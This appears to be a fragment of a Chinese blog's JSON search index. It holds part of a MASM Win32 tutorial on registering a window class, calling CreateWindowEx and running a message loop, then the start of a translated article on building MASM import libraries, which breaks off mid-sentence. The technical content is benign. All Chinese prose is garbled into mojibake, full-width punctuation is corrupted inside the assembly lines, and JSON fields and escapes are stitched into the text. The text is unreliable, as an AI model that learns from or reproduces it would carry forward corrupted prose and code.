lpfnWndProcï¼šçª—å£å¤„ç†å‡½æ•°çš„æŒ‡é’ˆã€‚ cbClsExtraï¼šæŒ‡å®šç´§è·Ÿåœ¨çª—å£ç±»ç»“æ„åçš„é™„åŠ å­—èŠ‚æ•°ã€‚ cbWndExtraï¼šæŒ‡å®šç´§è·Ÿåœ¨çª—å£äº‹ä¾‹åçš„é™„åŠ å­—èŠ‚æ•°ã€‚å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºåœ¨èµ„æºä¸­ç”¨CLASSä¼ªæŒ‡ä»¤æ³¨å†Œä¸€ä¸ªå¯¹è¯æ¡†ç±»æ—¶ï¼Œåˆ™å¿…é¡»æŠŠè¿™ä¸ªæˆå‘˜è®¾æˆDLGWINDOWEXTRAã€‚ hInstanceï¼šæœ¬æ¨¡å—çš„äº‹ä¾‹å¥æŸ„ã€‚ hIconï¼šå›¾æ ‡çš„å¥æŸ„ã€‚ hCursorï¼šå…‰æ ‡çš„å¥æŸ„ã€‚ hbrBackgroundï¼šèƒŒæ™¯ç”»åˆ·çš„å¥æŸ„ã€‚ lpszMenuNameï¼šæŒ‡å‘èœå•çš„æŒ‡é’ˆã€‚ lpszClassNameï¼šæŒ‡å‘ç±»åç§°çš„æŒ‡é’ˆã€‚ hIconSmï¼šå’Œçª—å£ç±»å…³è”çš„å°å›¾æ ‡ã€‚å¦‚æœè¯¥å€¼ä¸ºNULLã€‚åˆ™æŠŠhCursorä¸­çš„å›¾æ ‡è½¬æ¢æˆå¤§å°åˆé€‚çš„å°å›¾æ ‡ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 invoke CreateWindowExï¼Œ NULLï¼Œ\\ ADDR ClassNameï¼Œ\\ ADDR AppNameï¼Œ\\ WS_OVERLAPPEDWINDOWï¼Œ\\ CW_USEDEFAULTï¼Œ\\ CW_USEDEFAULTï¼Œ\\ CW_USEDEFAULTï¼Œ\\ CW_USEDEFAULTï¼Œ\\ NULLï¼Œ\\ NULLï¼Œ\\ hInstï¼Œ\\ NULL æ³¨å†Œçª—å£ç±»åï¼Œæˆ‘ä»¬å°†è°ƒç”¨CreateWindowExæ¥äº§ç”Ÿå®é™…çš„çª—å£ã€‚è¯·æ³¨æ„è¯¥å‡½æ•°æœ‰12ä¸ªå‚æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 CreateWindowExA proto dwExStyleï¼šDWORDï¼Œ\\ lpClassNameï¼šDWORDï¼Œ\\ lpWindowNameï¼šDWORDï¼Œ\\ dwStyleï¼šDWORDï¼Œ\\ Xï¼šDWORDï¼Œ\\ Yï¼šDWORDï¼Œ\\ nWidthï¼šDWORDï¼Œ\\ nHeightï¼šDWORDï¼Œ\\ hWndParentï¼šDWORD ï¼Œ\\ hMenuï¼šDWORDï¼Œ\\ hInstanceï¼šDWORDï¼Œ\\ lpParamï¼šDWORD æˆ‘ä»¬æ¥ä»”ç»†çœ‹ä¸€çœ‹è¿™äº›çš„å‚æ•°ï¼š\ndwExStyleï¼šé™„åŠ çš„çª—å£é£æ ¼ã€‚ç›¸å¯¹äºæ—§çš„CreateWindowè¿™æ˜¯ä¸€ä¸ªæ–°çš„å‚æ•°ã€‚åœ¨9X/NTä¸­æ‚¨å¯ä»¥ä½¿ç”¨æ–°çš„çª—å£é£æ ¼ã€‚æ‚¨å¯ä»¥åœ¨Styleä¸­æŒ‡å®šä¸€èˆ¬çš„çª—å£é£æ ¼ï¼Œä½†æ˜¯ä¸€äº›ç‰¹æ®Šçš„çª—å£é£æ ¼ï¼Œå¦‚é¡¶å±‚çª—å£åˆ™å¿…é¡»åœ¨æ­¤å‚æ•°ä¸­æŒ‡å®šã€‚å¦‚æœæ‚¨ä¸æƒ³æŒ‡å®šä»»ä½•ç‰¹åˆ«çš„é£æ ¼ï¼Œåˆ™æŠŠæ­¤å‚æ•°è®¾ä¸ºNULLã€‚ lpClassNameï¼šï¼ˆå¿…é¡»ï¼‰ã€‚ASCIIZå½¢å¼çš„çª—å£ç±»åç§°çš„åœ°å€ã€‚å¯ä»¥æ˜¯æ‚¨è‡ªå®šä¹‰çš„ç±»ï¼Œä¹Ÿå¯ä»¥æ˜¯é¢„å®šä¹‰çš„ç±»åã€‚åƒä¸Šé¢æ‰€è¯´ï¼Œæ¯ä¸€ä¸ªåº”ç”¨ç¨‹åºå¿…é¡»æœ‰ä¸€ä¸ªçª—å£ç±»ã€‚ lpWindowNameï¼šASCIIZå½¢å¼çš„çª—å£åç§°çš„åœ°å€ã€‚è¯¥åç§°ä¼šæ˜¾ç¤ºåœ¨æ ‡é¢˜æ¡ä¸Šã€‚å¦‚æœè¯¥å‚æ•°ç©ºç™½ï¼Œåˆ™æ ‡é¢˜æ¡ä¸Šä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚ dwStyleï¼šçª—å£çš„é£æ ¼ã€‚åœ¨æ­¤æ‚¨å¯ä»¥æŒ‡å®šçª—å£çš„å¤–è§‚ã€‚å¯ä»¥æŒ‡å®šè¯¥å‚æ•°ä¸ºé›¶ï¼Œä½†é‚£æ ·è¯¥çª—å£å°±æ²¡æœ‰ç³»ç»Ÿèœå•ï¼Œä¹Ÿæ²¡æœ‰æœ€å¤§åŒ–å’Œæœ€å°åŒ–æŒ‰é’®ï¼Œä¹Ÿæ²¡æœ‰å…³é—­æŒ‰é’®ï¼Œé‚£æ ·æ‚¨ä¸å¾—ä¸æŒ‰Alt+F4 æ¥å…³é—­å®ƒã€‚æœ€ä¸ºæ™®éçš„çª—å£ç±»é£æ ¼æ˜¯ WS_OVERLAPPEDWINDOWã€‚ ä¸€ç§çª—å£é£æ ¼æ˜¯ä¸€ç§æŒ‰ä½çš„æ©ç ï¼Œè¿™æ ·æ‚¨å¯ä»¥ç”¨oræŠŠæ‚¨å¸Œæœ›çš„çª—å£é£æ ¼æˆ–èµ·æ¥ã€‚åƒ WS_OVERLAPPEDWINDOW å°±æ˜¯ç”±å‡ ç§æœ€ä¸ºæ™®éçš„é£æ ¼orèµ·æ¥çš„ã€‚ Xï¼ŒYï¼š æŒ‡å®šçª—å£å·¦ä¸Šè§’çš„ä»¥åƒç´ ä¸ºå•ä½çš„å±å¹•åæ ‡ä½ç½®ã€‚ç¼ºçœåœ°å¯æŒ‡å®šä¸º CW_USEDEFAULTï¼Œè¿™æ · Windows ä¼šè‡ªåŠ¨ä¸ºçª—å£æŒ‡å®šæœ€åˆé€‚çš„ä½ç½®ã€‚ nWidthï¼ŒnHeightï¼š ä»¥åƒç´ ä¸ºå•ä½çš„çª—å£å¤§å°ã€‚ç¼ºçœåœ°å¯æŒ‡å®šä¸º CW_USEDEFAULTï¼Œè¿™æ · Windows ä¼šè‡ªåŠ¨ä¸ºçª—å£æŒ‡å®šæœ€åˆé€‚çš„å¤§å°ã€‚ hWndParentï¼š çˆ¶çª—å£çš„å¥æŸ„ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚è¿™ä¸ªå‚æ•°å‘Šè¯‰ Windows è¿™æ˜¯ä¸€ä¸ªå­çª—å£å’Œä»–çš„çˆ¶çª—å£æ˜¯è°ã€‚è¿™å’Œ MDIï¼ˆå¤šæ–‡æ¡£ç»“æ„ï¼‰ä¸åŒï¼Œæ­¤å¤„çš„å­çª—å£å¹¶ä¸ä¼šå±€é™åœ¨çˆ¶çª—å£çš„å®¢æˆ·åŒºå†…ã€‚ä»–åªæ˜¯ç”¨æ¥å‘Šè¯‰ Windows å„ä¸ªçª—å£ä¹‹é—´çš„çˆ¶å­å…³ç³»ï¼Œä»¥ä¾¿åœ¨çˆ¶çª—å£é”€æ¯æ˜¯ä¸€åŒæŠŠå…¶å­çª—å£é”€æ¯ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ç¨‹åºä¸­å› ä¸ºåªæœ‰ä¸€ä¸ªçª—å£ï¼Œæ•…æŠŠè¯¥å‚æ•°è®¾ä¸º NULLã€‚ hMenuï¼š WINDOWSèœå•çš„å¥æŸ„ã€‚å¦‚æœåªç”¨ç³»ç»Ÿèœå•åˆ™æŒ‡å®šè¯¥å‚æ•°ä¸ºNULLã€‚å›å¤´çœ‹ä¸€çœ‹WNDCLASSEX ç»“æ„ä¸­çš„ lpszMenuName å‚æ•°ï¼Œå®ƒä¹ŸæŒ‡å®šä¸€ä¸ªèœå•ï¼Œè¿™æ˜¯ä¸€ä¸ªç¼ºçœèœå•ï¼Œä»»ä½•ä»è¯¥çª—å£ç±»æ´¾ç”Ÿçš„çª—å£è‹¥æƒ³ç”¨å…¶ä»–çš„èœå•éœ€åœ¨è¯¥å‚æ•°ä¸­é‡æ–°æŒ‡å®šã€‚å…¶å®è¯¥å‚æ•°æœ‰åŒé‡æ„ä¹‰ï¼šä¸€æ–¹é¢è‹¥è¿™æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çª—å£æ—¶è¯¥å‚æ•°ä»£è¡¨èœå•å¥æŸ„ï¼Œå¦ä¸€æ–¹é¢ï¼Œè‹¥è¿™æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çª—å£æ—¶ï¼Œè¯¥å‚æ•°ä»£è¡¨æ˜¯è¯¥çª—å£çš„ ID å·ã€‚Windows æ˜¯æ ¹æ®lpClassName å‚æ•°æ¥åŒºåˆ†æ˜¯è‡ªå®šä¹‰çª—å£è¿˜æ˜¯é¢„å®šä¹‰çª—å£çš„ã€‚ hInstanceï¼š äº§ç”Ÿè¯¥çª—å£çš„åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ã€‚ lpParamï¼š ï¼ˆå¯é€‰ï¼‰æŒ‡å‘æ¬²ä¼ ç»™çª—å£çš„ç»“æ„ä½“æ•°æ®ç±»å‹å‚æ•°çš„æŒ‡é’ˆã€‚å¦‚åœ¨MDIä¸­åœ¨äº§ç”Ÿçª—å£æ—¶ä¼ é€’ CLIENTCREATESTRUCT ç»“æ„çš„å‚æ•°ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¯¥å€¼æ€»ä¸ºé›¶ï¼Œè¿™è¡¨ç¤ºæ²¡æœ‰å‚æ•°ä¼ é€’ç»™çª—å£ã€‚å¯ä»¥é€šè¿‡GetWindowLong å‡½æ•°æ£€ç´¢è¯¥å€¼ã€‚ 1 2 3 mov hwndï¼Œeax invoke ShowWindowï¼Œ hwndï¼ŒCmdShow invoke UpdateWindowï¼Œ hwnd è°ƒç”¨CreateWindowExæˆåŠŸåï¼Œçª—å£å¥æŸ„åœ¨eaxä¸­ã€‚æˆ‘ä»¬å¿…é¡»ä¿å­˜è¯¥å€¼ä»¥å¤‡åç”¨ã€‚æˆ‘ä»¬åˆšåˆšäº§ç”Ÿçš„çª—å£ä¸ä¼šè‡ªåŠ¨æ˜¾ç¤ºï¼Œæ‰€ä»¥å¿…é¡»è°ƒç”¨ ShowWindow æ¥æŒ‰ç…§æˆ‘ä»¬å¸Œæœ›çš„æ–¹å¼æ¥æ˜¾ç¤ºè¯¥çª—å£ã€‚æ¥ä¸‹æ¥è°ƒç”¨ UpdateWindow æ¥æ›´æ–°å®¢æˆ·åŒºã€‚\n1 2 3 4 5 6 .WHILE TRUE invoke GetMessageï¼Œ ADDR msgï¼ŒNULLï¼Œ0ï¼Œ0 .BREAK .IF (!eax) invoke TranslateMessageï¼Œ ADDR msg invoke DispatchMessageï¼Œ ADDR msg .ENDW è¿™æ—¶å€™æˆ‘ä»¬çš„çª—å£å·²æ˜¾ç¤ºåœ¨å±å¹•ä¸Šäº†ã€‚ä½†æ˜¯å®ƒè¿˜ä¸èƒ½ä»å¤–ç•Œæ¥æ”¶æ¶ˆæ¯ã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»ç»™å®ƒæä¾›ç›¸å…³çš„æ¶ˆæ¯ã€‚æˆ‘ä»¬æ˜¯é€šè¿‡ä¸€ä¸ªæ¶ˆæ¯å¾ªç¯æ¥å®Œæˆè¯¥é¡¹å·¥ä½œçš„ã€‚æ¯ä¸€ä¸ªæ¨¡å—ä»…æœ‰ä¸€ä¸ªæ¶ˆæ¯å¾ªç¯ï¼Œæˆ‘ä»¬ä¸æ–­åœ°è°ƒç”¨ GetMessage ä» Windows ä¸­è·å¾—æ¶ˆæ¯ã€‚GetMessage ä¼ é€’ä¸€ä¸ª MSG ç»“æ„ä½“ç»™ Windows ï¼Œç„¶å Windows åœ¨è¯¥å‡½æ•°ä¸­å¡«å……æœ‰å…³çš„æ¶ˆæ¯ï¼Œä¸€ç›´åˆ° Windows æ‰¾åˆ°å¹¶å¡«å……å¥½æ¶ˆæ¯å GetMessage æ‰ä¼šè¿”å›ã€‚åœ¨è¿™æ®µæ—¶é—´å†…ç³»ç»Ÿæ§åˆ¶æƒå¯èƒ½ä¼šè½¬ç§»ç»™å…¶ä»–çš„åº”ç”¨ç¨‹åºã€‚è¿™æ ·å°±æ„æˆäº†Windows ä¸‹çš„å¤šä»»åŠ¡ç»“æ„ã€‚å¦‚æœ GetMessage æ¥æ”¶åˆ° WM_QUIT æ¶ˆæ¯åå°±ä¼šè¿”å› FALSEï¼Œä½¿å¾ªç¯ç»“æŸå¹¶é€€å‡ºåº”ç”¨ç¨‹åºã€‚TranslateMessage å‡½æ•°æ˜¯ä¸€ä¸ªæ˜¯å®ç”¨å‡½æ•°ï¼Œå®ƒä»é”®ç›˜æ¥å—åŸå§‹æŒ‰é”®æ¶ˆæ¯ï¼Œç„¶åè§£é‡Šæˆ WM_CHARï¼Œå†æŠŠ WM_CHAR æ”¾å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç”±äºç»è¿‡è§£é‡Šåçš„æ¶ˆæ¯ä¸­å«æœ‰æŒ‰é”®çš„ ASCII ç ï¼Œè¿™æ¯”åŸå§‹çš„æ‰«æç å¥½ç†è§£å¾—å¤šã€‚å¦‚æœæ‚¨çš„åº”ç”¨ç¨‹åºä¸å¤„ç†æŒ‰é”®æ¶ˆæ¯çš„è¯ï¼Œå¯ä»¥ä¸è°ƒç”¨è¯¥å‡½æ•°ã€‚DispatchMessage ä¼šæŠŠæ¶ˆæ¯å‘é€ç»™è´Ÿè´£è¯¥çª—å£è¿‡ç¨‹çš„å‡½æ•°ã€‚\n1 2 3 mov eaxï¼Œmsg.wParam ret WinMain endp å¦‚æœæ¶ˆæ¯å¾ªç¯ç»“æŸäº†ï¼Œé€€å‡ºç å­˜æ”¾åœ¨ MSG ä¸­çš„ wParamä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æŠŠå®ƒæ”¾åˆ° eax å¯„å­˜å™¨ä¸­ä¼ ç»™ Windowsï¼Œç›®å‰ Windows æ²¡æœ‰åˆ©ç”¨åˆ°è¿™ä¸ªç»“æŸç ï¼Œä½†æˆ‘ä»¬æœ€å¥½è¿˜æ˜¯éµä» Windows è§„èŒƒå·²é˜²æ„å¤–ã€‚\n1 WndProc proc hWndï¼šHWNDï¼Œ uMsgï¼šUINTï¼Œ wParamï¼šWPARAMï¼Œ lParamï¼šLPARAM æ˜¯æˆ‘ä»¬çš„çª—å£å¤„ç†å‡½æ•°ã€‚æ‚¨å¯ä»¥éšä¾¿ç»™è¯¥å‡½æ•°å‘½åã€‚å…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•° hWnd æ˜¯æ¥æ”¶æ¶ˆæ¯çš„çª—å£çš„å¥æŸ„ã€‚uMsg æ˜¯æ¥æ”¶çš„æ¶ˆæ¯ã€‚æ³¨æ„ uMsg ä¸æ˜¯ä¸€ä¸ª MSG ç»“æ„ï¼Œå…¶å®ä¸Šåªæ˜¯ä¸€ä¸ª DWORD ç±»å‹æ•°ã€‚Windows å®šä¹‰äº†æˆç™¾ä¸Šåƒä¸ªæ¶ˆæ¯ï¼Œå¤§å¤šæ•°æ‚¨çš„åº”ç”¨ç¨‹åºä¸ä¼šå¤„ç†åˆ°ã€‚å½“æœ‰è¯¥çª—å£çš„æ¶ˆæ¯å‘ç”Ÿæ—¶ï¼ŒWindows ä¼šå‘é€ä¸€ä¸ªç›¸å…³æ¶ˆæ¯ç»™è¯¥çª—å£ã€‚å…¶çª—å£è¿‡ç¨‹å¤„ç†å‡½æ•°ä¼šæ™ºèƒ½çš„å¤„ç†è¿™äº›æ¶ˆæ¯ã€‚wParam å’Œ lParam åªæ˜¯é™„åŠ å‚æ•°ï¼Œä»¥æ–¹ä¾¿ä¼ é€’æ›´å¤šçš„å’Œè¯¥æ¶ˆæ¯æœ‰å…³çš„æ•°æ®ã€‚\n1 2 3 4 5 6 7 8 9 .IF uMsg==WM_DESTROY invoke PostQuitMessageï¼ŒNULL .ELSE invoke DefWindowProcï¼ŒhWndï¼ŒuMsgï¼ŒwParamï¼ŒlParam ret .ENDIF xor eaxï¼Œeax ret WndProc endp ä¸Šé¢å¯ä»¥è¯´æ˜¯å…³é”®éƒ¨åˆ†ã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»¬å†™ Windows ç¨‹åºæ—¶éœ€è¦æ”¹å†™çš„ä¸»è¦éƒ¨åˆ†ã€‚æ­¤å¤„æ‚¨çš„ç¨‹åºæ£€æŸ¥ Windows ä¼ é€’è¿‡æ¥çš„æ¶ˆæ¯ï¼Œå¦‚æœæ˜¯æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ¶ˆæ¯åˆ™åŠ ä»¥å¤„ç†ï¼Œå¤„ç†å®Œåï¼Œåœ¨ eax å¯„å­˜å™¨ä¸­ä¼ é€’ 0ï¼Œå¦åˆ™å¿…é¡»è°ƒç”¨ DefWindowProcï¼ŒæŠŠè¯¥çª—å£è¿‡ç¨‹æ¥æ”¶åˆ°çš„å‚æ•°ä¼ é€’ç»™ç¼ºçœçš„çª—å£å¤„ç†å‡½æ•°ã€‚æ‰€æœ‰æ¶ˆæ¯ä¸­æ‚¨å¿…é¡»å¤„ç†çš„æ˜¯ WM_DESTROYï¼Œå½“æ‚¨çš„åº”ç”¨ç¨‹åºç»“æŸæ—¶ Windows æŠŠè¿™ä¸ªæ¶ˆæ¯ä¼ é€’è¿›æ¥ï¼Œå½“æ‚¨çš„åº”ç”¨ç¨‹åºæ¥æ”¶åˆ°è¯¥æ¶ˆæ¯æ—¶å®ƒå·²ç»åœ¨å±å¹•ä¸Šæ¶ˆå¤±äº†ï¼Œè¿™ä»…æ˜¯é€šçŸ¥æ‚¨çš„åº”ç”¨ç¨‹åºçª—å£å·²é”€æ¯ï¼Œæ‚¨å¿…é¡»è‡ªå·±å‡†å¤‡è¿”å› Windows ã€‚åœ¨æ­¤æ¶ˆæ¯ä¸­æ‚¨å¯ä»¥åšä¸€äº›æ¸…ç†å·¥ä½œï¼Œä½†æ— æ³•é˜»æ­¢é€€å‡ºåº”ç”¨ç¨‹åºã€‚å¦‚æœæ‚¨è¦åœ¨çª—å£é”€æ¯å‰åšä¸€äº›é¢å¤–å·¥ä½œï¼Œå¯ä»¥å¤„ç† WM_CLOSE æ¶ˆæ¯ã€‚åœ¨å¤„ç†å®Œæ¸…ç†å·¥ä½œåï¼Œæ‚¨å¿…é¡»è°ƒç”¨ PostQuitMessageï¼Œè¯¥å‡½æ•°ä¼šæŠŠ WM_QUIT æ¶ˆæ¯ä¼ å›æ‚¨çš„åº”ç”¨ç¨‹åºï¼Œè€Œè¯¥æ¶ˆæ¯ä¼šä½¿å¾— GetMessage è¿”å›ï¼Œå¹¶åœ¨ eax å¯„å­˜å™¨ä¸­æ”¾å…¥ 0ï¼Œç„¶åä¼šç»“æŸæ¶ˆæ¯å¾ªç¯å¹¶é€€å› WINDOWSã€‚æ‚¨å¯ä»¥åœ¨æ‚¨çš„ç¨‹åºä¸­è°ƒç”¨ DestroyWindow å‡½æ•°ï¼Œå®ƒä¼šå‘é€ä¸€ä¸ª WM_DESTROY æ¶ˆæ¯ç»™æ‚¨è‡ªå·±çš„åº”ç”¨ç¨‹åºï¼Œä»è€Œè¿«ä½¿å®ƒé€€å‡ºã€‚\n","permalink":"https://www.hacktech.cn/post/win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-3-%E7%AE%80%E5%8D%95%E7%9A%84%E7%AA%97%E5%8F%A3.html","summary":"\u003cp\u003eè¿™æ¬¡æˆ‘ä»¬å°†å†™ä¸€ä¸ª Windows ç¨‹åºï¼Œå®ƒä¼šåœ¨æ¡Œé¢æ˜¾ç¤ºä¸€ä¸ªæ ‡å‡†çš„çª—å£ï¼Œä»¥æ­¤æ ¹æ®ä»£ç æ¥å­¦ä¹ å¦‚ä½•åˆ›å»ºä¸€ä¸ªç®€å•çš„çª—å£ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (3)ï¼šç®€å•çš„çª—å£"},{"content":"by Iczelion ï¼ˆç¿»è¯‘ï¼šèŠ±å¿ƒèåœyqzq@163.net) 9.5.2000\nè¿™ç¯‡çŸ­æ–‡æ˜¯è®²è¿°å…³äºå»ºç«‹MASMå¯¼å…¥åº“ï¼ˆimport librariesï¼‰æŠ€å·§ï¼Œæˆ‘å‡è®¾ä½ å·²ç»çŸ¥é“ä»€ä¹ˆæ˜¯å¯¼å…¥åº“ã€‚åœ¨ä¸‹é¢ï¼Œæˆ‘å°†é›†ä¸­è®²è¿°å»ºç«‹MASMå¯¼å…¥åº“çš„æ–¹æ³•ã€‚\nMASMå¯¼å…¥åº“çš„æ ¼å¼ï¼š MASMå’ŒVC++å¯ä»¥ä½¿ç”¨ç›¸åŒçš„å¯¼å…¥åº“ï¼ŒMSå¯¼å…¥åº“ä½¿ç”¨ä¸åŒäºTASMçš„OMFæ ¼å¼çš„å˜æ›´çš„COFFæ–‡ä»¶æ ¼å¼ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆTASMå’ŒMASMçš„å¯¼å…¥åº“ä¸èƒ½äº’ç”¨çš„åŸå› ï¼Œæˆ‘å°†ä¸è¯¦ç»†ä»‹ç»æœ‰å…³MSå¯¼å…¥åº“çš„æ ¼å¼ã€‚å¯ä»¥è¿™æ ·è¯´ï¼Œæ¯ä¸€ä¸ªMSå¯¼å…¥åº“éƒ½åŒ…å«æŸä¸ªDLLä¸­å‡½æ•°çš„ä¿¡æ¯ï¼ˆä½ å°†è¦ç”¨è¿™äº›ä¿¡æ¯æ¥è°ƒç”¨DLLä¸­çš„å‡½æ•°ï¼‰ï¼Œè¿™äº›ä¿¡æ¯åŒ…æ‹¬å‡½æ•°åå’Œå®ƒæ‰€æœ‰å‚æ•°çš„å°ºå¯¸ã€‚å¦‚æœä½ ç”¨ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€kernel32.libï¼Œä½ å›å‘ç°ä¸€äº›å¦‚ä¸‹æ ¼å¼çš„ä¿¡æ¯ï¼š\n1 2 _ExitProcess@4 _CreateProcessA@40 å‡½æ•°åè¢«è£…é¥°ä¸Šäº†ä¸€ä¸ªâ€œ_â€ï¼Œåœ¨â€œ@â€ä¹‹åçš„æ•°å­—è¡¨ç¤ºäº†è¯¥å‡½æ•°æ‰€æœ‰å‚æ•°çš„å°ºå¯¸ï¼ˆå­—èŠ‚ä¸ºå•ä½ï¼‰ï¼ŒExitProcess å‡½æ•°åªæœ‰ä¸€ä¸ªDWORDçš„å‚æ•°ï¼Œæ‰€ä»¥åé¢çš„æ•°å­—æ˜¯4ã€‚ LIBä¸­ä¸ºä»€ä¹ˆè¦åŒ…å«è¿™äº›å‚æ•°å°ºå¯¸çš„ä¿¡æ¯å‘¢ï¼Ÿå½“ä½ ç”¨INVOKEè°ƒç”¨å‡½æ•°æ—¶ï¼Œè¿™äº›ä¿¡æ¯è¢«ç”¨æ¥æ£€æµ‹ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°æ˜¯å¦æ­£ç¡®ã€‚å¦‚æœä½ ä½¿ç”¨â€œæ‰‹å·¥â€å°†å‚æ•°å‹å…¥å †æ ˆï¼Œå¹¶é€šè¿‡â€œCALLâ€æ¥è°ƒç”¨å‡½æ•°çš„è¯ï¼ŒMASMå°†æ— æ³•æ£€æµ‹å‚æ•°æ˜¯å¦æ­£ç¡®ã€‚è¿™å°†å¯¼è‡´æˆ‘ä»¬å‡ ä¹æ²¡æœ‰åŠæ³•å»ºç«‹ä¸€ä¸ªDLLçš„å¯¼å…¥åº“ï¼Œå› ä¸ºDLLå¹¶ä¸åŒ…å«æ¸…æ¥šçš„å…³äºå‚æ•°å°ºå¯¸çš„ä¿¡æ¯ã€‚\nä»DLLå»ºç«‹MASMå¯¼å…¥åº“ å¦‚æœä½ å¾ˆä¹æ„ç”¨â€œæ‰‹åŠ¨â€ï¼ˆCALLï¼‰çš„æ–¹æ³•å»è°ƒç”¨å‡½æ•°çš„è¯ï¼Œä½ å¯ä»¥è±¡ä¸‹é¢è¿™æ ·ä¸ºä»»ä½•ä¸€ä¸ªDLLå»ºç«‹MASMçš„å¯¼å…¥åº“ï¼š ä½¿ç”¨dumpbin.exe,å®ƒå¯ä»¥å¯¼å‡ºDLL è¾“å‡ºï¼ˆEXPORTï¼‰å‡½æ•°çš„åå­—ã€‚\n1 Dumpbin /EXPORTS blah.dll \u0026gt; output.txt åœ¨ä½ è·å¾—äº†å‡½æ•°ååˆ—è¡¨ä¹‹åï¼Œé€šè¿‡ä»–ä»¬å»ºç«‹ä¸€ä¸ªæ¨¡å—å®šä¹‰æ–‡ä»¶ï¼ˆ.DEFï¼‰ã€‚ ä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœDLLåªåŒ…å«ä¸€ä¸ªå‡½æ•°ï¼šGetSomeLine åœ¨ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è¾“å…¥å¦‚ä¸‹å†…å®¹ï¼š\n1 2 3 LIBRARY blah EXPORTS GetSomeLine å¹¶å°†å…¶ä¿å­˜ä¸ºâ€œblah.def\nè±¡è¿™æ ·ï¼Œè¿è¡Œlib.exeï¼Œé€šè¿‡æ¨¡å—å®šä¹‰æ–‡ä»¶å»ºç«‹ä¸€ä¸ªå¯¼å…¥åº“ï¼š\n1 lib /DEF:blah.def å°±æ˜¯å®ƒäº†ï¼ä½ å°†è·å¾—blah.lib,åªè¦ä½ ä¸ä½¿ç”¨INVOKEè°ƒç”¨å‡½æ•°çš„è¯ï¼Œä½ å°±å¯ä»¥åœ¨MASMä¸­ä½¿ç”¨å®ƒã€‚\nå»ºç«‹é€šè¿‡INVOKEè°ƒç”¨å‡½æ•°çš„MASMå¯¼å…¥åº“: æˆ‘å¹¶ä¸åå¯¹ä½ ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•ï¼Œä½†INVOKEç¡®å®æ˜¯ä¸€ä¸ªè°ƒç”¨å‡½æ•°çš„å¥½é€”å¾„ã€‚è¿™ä¹Ÿæ˜¯æˆ‘è¾ƒTASMæ›´å–œæ¬¢MASMçš„åŸå› ä¹‹ä¸€ã€‚ä½†å°±è±¡æˆ‘æ—©å…ˆå¼ºè°ƒçš„ï¼Œæˆ‘ä»¬å‡ ä¹ä¸å¯èƒ½ä»ä¸€ä¸ªDLLå»ºç«‹ä¸€ä¸ªèƒ½100%å·¥ä½œçš„MASMå¯¼å…¥åº“ã€‚å¦‚æœä½ ä½¿ç”¨INVOKEï¼Œä½ å°†ä¸èƒ½ç”¨ä¸Šé¢çš„æ–¹æ³•å»ºç«‹ä¸€ä¸ªMASMå¯¼å…¥åº“ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½ å¯ä»¥æƒ³è±¡å¦‚æœä½ åœ¨.DEFæ–‡ä»¶ä¸­ä¿®æ”¹äº†å‡½æ•°çš„â€œ@XXâ€éƒ¨åˆ†ï¼Œå¯¼å…¥åº“å°†ä»ç„¶æ­£å¸¸å»ºç«‹ï¼Œä½†è¯·ç›¸ä¿¡æˆ‘ï¼Œä»–ä¸ä¼šå·¥ä½œçš„ã€‚ å»ºç«‹ä¸€ä¸ªå¯ä»¥ä½¿ç”¨INVOKEçš„å¯¼å…¥åº“çš„ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨MASMã€‚å¦‚æœä½ å†™è¿‡DLLçš„ä»£ç ï¼Œä½ ä¼šå‘ç°ä½ ä¸ä»…çš„åˆ°äº†ä¸€ä¸ªDLLï¼Œè€Œä¸”è¿˜å¾—åˆ°äº†ä¸€ä¸ªå¯¼å…¥åº“ï¼Œæ²¡é”™ï¼Œå®ƒå°±æ˜¯æˆ‘ä»¬è¦å¾—ï¼ æˆ‘ä»¬çš„ç­–ç•¥æ˜¯ï¼š\nè·å¾—å‡½æ•°åå’Œæ‰€æœ‰å‚æ•°çš„å°ºå¯¸ å»ºç«‹ä¸€ä¸ªåŒ…å«æ­£ç¡®ä¸ªæ•°å’Œå°ºå¯¸çš„DLLæºä»£ç  å»ºç«‹ä¸€ä¸ªæè¿°ASMæºä»£ç ä¸­ç›¸åº”å‡½æ•°çš„æ¨¡å—å®šä¹‰æ–‡ä»¶ï¼ˆ.DEFï¼‰ å°†æºä»£ç æŒ‰DLLæ±‡ç¼– ä½ å°†è·å¾—ä¸€ä¸ªåŠŸèƒ½å®Œå…¨çš„MASMå¯¼å…¥åº“ï¼Œä¸Šé¢çš„æ­¥éª¤åº”åšæ›´å¤šçš„è¯´æ˜\nè·å¾—å‡½æ•°åå’Œæ‰€æœ‰å‚æ•°å°ºå¯¸ è¿™æ˜¯æˆ‘ä»¬å¤„ç†è¿‡ç¨‹ä¸­æœ€å›°éš¾çš„éƒ¨åˆ†äº†ã€‚å¦‚æœä½ ä»…ä»…åªæœ‰DLLï¼Œä½ å°†ç»å†æ— 